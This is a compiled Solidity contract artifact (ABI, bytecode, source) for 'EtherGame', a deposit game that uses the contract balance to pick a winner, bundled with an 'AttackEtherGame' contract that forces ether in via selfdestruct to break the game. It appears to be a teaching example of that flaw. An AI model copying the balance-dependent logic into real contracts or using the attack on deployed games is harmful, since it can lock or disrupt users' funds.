{
  "contractName": "EtherGame",
  "abi": [
    {
      "inputs": [],
      "name": "targetAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "winner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "claimReward",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052676124fee993bc000060005534801561001c57600080fd5b506105d68061002c6000396000f3fe60806040526004361061003f5760003560e01c8063953b8fb814610044578063b88a802f1461006f578063d0e30db014610086578063dfbf53ae14610090575b600080fd5b34801561005057600080fd5b506100596100bb565b6040516100669190610322565b60405180910390f35b34801561007b57600080fd5b506100846100c1565b005b61008e610200565b005b34801561009c57600080fd5b506100a56102e3565b6040516100b2919061037e565b60405180910390f35b60005481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610151576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610148906103f6565b60405180910390fd5b60003373ffffffffffffffffffffffffffffffffffffffff164760405161017790610447565b60006040518083038185875af1925050503d80600081146101b4576040519150601f19603f3d011682016040523d82523d6000602084013e6101b9565b606091505b50509050806101fd576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101f4906104a8565b60405180910390fd5b50565b670de0b6b3a7640000341461024a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161024190610514565b60405180910390fd5b6000479050600054811115610294576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161028b90610580565b60405180910390fd5b6000548114156102e05733600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b61031c81610309565b82525050565b60006020820190506103376000830184610313565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006103688261033d565b9050919050565b6103788161035d565b82525050565b6000602082019050610393600083018461036f565b92915050565b600082825260208201905092915050565b7f6e6f742077696e6e657200000000000000000000000000000000000000000000600082015250565b60006103e0600a83610399565b91506103eb826103aa565b602082019050919050565b6000602082019050818103600083015261040f816103d3565b9050919050565b600081905092915050565b50565b6000610431600083610416565b915061043c82610421565b600082019050919050565b600061045282610424565b9150819050919050565b7f6661696c656420746f2073656e64206574686572000000000000000000000000600082015250565b6000610492601483610399565b915061049d8261045c565b602082019050919050565b600060208201905081810360008301526104c181610485565b9050919050565b7f796f752063616e206f6e6c792073656e64203120657468657200000000000000600082015250565b60006104fe601983610399565b9150610509826104c8565b602082019050919050565b6000602082019050818103600083015261052d816104f1565b9050919050565b7f67616d65206973206f7665720000000000000000000000000000000000000000600082015250565b600061056a600c83610399565b915061057582610534565b602082019050919050565b600060208201905081810360008301526105998161055d565b905091905056fea2646970667358221220529e16e0c625af41803aa9d1a027f3be910b61a43aa477bd3fb2b59b45e92ca764736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract EtherGame {\n    uint public targetAmount = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"you can only send 1 ether\");\n\n        uint balance = address(this).balance;\n        require(balance <= targetAmount, \"game is over\");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"not winner\");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(sent, \"failed to send ether\");\n    }\n}\n\ncontract AttackEtherGame {\n    EtherGame etherGame;\n\n    constructor(EtherGame _etherGame) {\n        etherGame = EtherGame(_etherGame);\n    }\n\n    function attack() public payable {\n        address payable addr = payable(address(etherGame));\n        selfdestruct(addr);\n    }\n}",
  "sourcePath": "/Users/mac/Documents/GitHub/CodeSnippets/Solidity/polygon/contracts/EtherGame.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2021-12-25T14:23:16.153Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}